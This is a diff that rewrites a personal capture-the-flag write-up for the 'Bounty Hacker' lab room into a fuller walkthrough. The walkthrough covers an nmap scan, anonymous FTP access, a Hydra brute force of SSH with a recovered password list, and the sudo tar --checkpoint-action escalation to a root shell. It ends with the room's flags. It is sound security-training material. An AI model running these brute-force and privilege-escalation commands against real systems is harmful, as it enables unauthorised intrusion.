@@ -1,7 +1,7 @@
 ---
-title: "Bounty Hunter"
+title: "Bounty Hacker"
 slug: "bounty-hunter"
-category: "web-application"
+category: "linux"
 description: "You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!"
 date: "2025-10-18"
 ---
@@ -10,72 +10,134 @@ date: "2025-10-18"
 
 ## Tools Used:
 
-- **nmap** — Port scanning and service detection
-- **gobuster** — Directory brute-forcing on the web server
-- **hydra** — Brute-force login credentials
-- **ftp / ssh** — File access and remote login
-- **GTFOBins** — Privilege escalation reference
+- **Nmap** — Port scanning and service detection
+- **Gobuster** — Directory brute-forcing on the web server
+- **Hydra** — Brute-forcing SSH credentials
+- **FTP / SSH** — File access and remote login
+- **GTFOBins** — Privilege escalation reference
 
 ## Environment:
 
-- Local Kali linux virtual machine.
+- TryHackMe hosted target machine (via VPN connection)
+- Kali Linux (attacker machine)
 
 # Initial Recon
 
-Firstly, I scanned for services with nmap. doing this found three services: ftp on port 21; ssh on port 20; and http on port 80.
-
-# ️Exploitation / Solution
-
-## 1. Exploration
-
-- I went to the website on the network and was meet with a landing page.
-- There were no links to other pages so, i decided to use gobuster to find any more pages. i found a page called home and another page.
-- After this i thought to look at what is on the ftp server. I opened the ftp server to a login form. I tried name as the user name and a message saying “only for anonymous”.
-- I signed into ftp with anonymous as my user name and listed files, i found two files and downloaded them.
-
-## 2. Exploitation
-
-- Found out one was a message written by someone called lin.
-- The other contained a list of passwords.
-- I then used hydra with the password list and “lin” as the username to find out the password to the ssh client.
-- the password was “RedDragonSyndicate” and i signed onto ssh using it.
-
-## 3. Privilege escalation.
-
-- I listed sudo privileges and then looked on gtoblins for privilege escalation commands.
-- Used command to escalate privalges and gain root.
-- found the user flag and navigated to root to find the root flag.
-
-# Flag
+I deployed the machine and ran an Nmap scan to identify open services:
 
 ```
-THM{CR1M3_SyNd1C4T3}
-THM{80UN7Y_h4cK3r}
+nmap -sV <target-ip>
+```
+
+This revealed three open ports:
+
+- FTP on port 21
+- SSH on port 22
+- HTTP on port 80
+
+# Exploitation / Solution
+
+## Step One — Web Enumeration
+
+Visiting the IP in a browser showed a landing page with no navigation links. I ran Gobuster to look for hidden directories:
+
+```
+gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+This didn't yield anything exploitable — the web server turned out to be a red herring. Attention shifted to the FTP service.
+
+## Step Two — Anonymous FTP Access
+
+FTP servers are sometimes configured to allow unauthenticated access via the `anonymous` username. I tried it:
+
+```
+ftp <target-ip>
+```
+
+The login succeeded with `anonymous` as the username. Listing the directory revealed two files:
+
+- `task.txt` — a to-do list signed by **lin**, giving us a confirmed username
+- `locks.txt` — a list of passwords
+
+I downloaded both with `get`:
+
+```
+get task.txt
+get locks.txt
+```
+
+## Step Three — Brute-Forcing SSH
+
+With a username (`lin`) and a password list (`locks.txt`), I ran Hydra against the SSH service:
+
+```
+hydra -l lin -P locks.txt ssh://<target-ip>
+```
+
+Hydra returned a valid password: **RedDr4gonSynd1cat3**. I logged in via SSH:
+
+```
+ssh lin@<target-ip>
+```
+
+The user flag was in a file on lin's desktop:
+
+```
+cat user.txt
+```
+
+## Step Four — Privilege Escalation
+
+I checked what commands lin could run as root:
+
+```
+sudo -l
+```
+
+The output showed lin was permitted to run `/bin/tar` as root. I cross-referenced `tar` on GTFOBins, which lists a known sudo escalation technique using tar's `--checkpoint` and `--checkpoint-action` flags to execute an arbitrary command as the owner of the process — in this case, root:
+
+```
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+This spawned a root shell. I navigated to `/root` and retrieved the final flag:
+
+```
+cat /root/root.txt
+```
+
+# Flags
+
+```
+User Flag: THM{CR1M3_SyNd1C4T3}
+Root Flag: THM{80UN7Y_h4cK3r}
 ```
 
 # Tools Used
 
-- **nmap** — Discovered open ports and running services
-- **gobuster** — Enumerated hidden web directories
-- **hydra** — Brute-forced SSH password
-- **ftp/ssh** — Connected to services and navigated the file system
-- **GTFOBins** — Found privilege escalation vectors
+- **Nmap** — Discovered open ports and running services
+- **Gobuster** — Enumerated web directories (no useful results)
+- **Hydra** — Brute-forced SSH password using recovered wordlist
+- **FTP / SSH** — Connected to services and navigated the file system
+- **GTFOBins** — Identified `tar` sudo privilege escalation technique
 
 # Notes / Lessons Learned
 
-- Anonymous FTP access can expose sensitive information.
-- Always check for reused usernames in file contents — they often become SSH usernames.
-- Directory brute-forcing is essential when a website has little to no navigation.
-- GTFOBins is a key resource for privilege escalation when you have limited sudo rights.
+- Always check FTP for anonymous login — it's a quick win that's easy to miss if you tunnel-vision on the web server.
+- Usernames embedded in file contents (like `task.txt` signed by lin) are common CTF clues and worth noting immediately.
+- A password list recovered from the target is almost always the intended wordlist for the subsequent brute-force step.
+- `sudo -l` should be one of the first commands run after gaining initial access — knowing which binaries can be run as root often determines the entire privesc path.
+- GTFOBins covers `tar` in detail: the `--checkpoint-action` flag can execute arbitrary commands mid-archive, making it a clean escalation vector when tar has sudo rights.
 
 <carousel>
-![Screenshot of the challenge soloution](/images/bounty-hunter/Bounty_Hunter_Screenshot_1.png)
-![Screenshot of the challenge soloution](/images/bounty-hunter/Bounty_Hunter_Screenshot_2.png)
-![Screenshot of the challenge soloution](/images/bounty-hunter/Bounty_Hunter_Screenshot_3.png)
-![Screenshot of the challenge soloution](/images/bounty-hunter/Bounty_Hunter_Screenshot_4.png)
-![Screenshot of the challenge soloution](/images/bounty-hunter/Bounty_Hunter_Screenshot_5.png)
-![Screenshot of the challenge soloution](/images/bounty-hunter/Bounty_Hunter_Screenshot_6.png)
-![Screenshot of the challenge soloution](/images/bounty-hunter/Bounty_Hunter_Screenshot_7.png)
-![Screenshot of the challenge soloution](/images/bounty-hunter/Bounty_Hunter_Screenshot_8.png)
-![Screenshot of the challenge soloution](/images/bounty-hunter/Bounty_Hunter_Screenshot_9.png)
+![Screenshot 1](/images/bounty-hunter/Bounty_Hunter_Screenshot_1.png)
+![Screenshot 2](/images/bounty-hunter/Bounty_Hunter_Screenshot_2.png)
+![Screenshot 3](/images/bounty-hunter/Bounty_Hunter_Screenshot_3.png)
+![Screenshot 4](/images/bounty-hunter/Bounty_Hunter_Screenshot_4.png)
+![Screenshot 5](/images/bounty-hunter/Bounty_Hunter_Screenshot_5.png)
+![Screenshot 6](/images/bounty-hunter/Bounty_Hunter_Screenshot_6.png)
+![Screenshot 7](/images/bounty-hunter/Bounty_Hunter_Screenshot_7.png)
+![Screenshot 8](/images/bounty-hunter/Bounty_Hunter_Screenshot_8.png)
+![Screenshot 9](/images/bounty-hunter/Bounty_Hunter_Screenshot_9.png)
 </carousel>
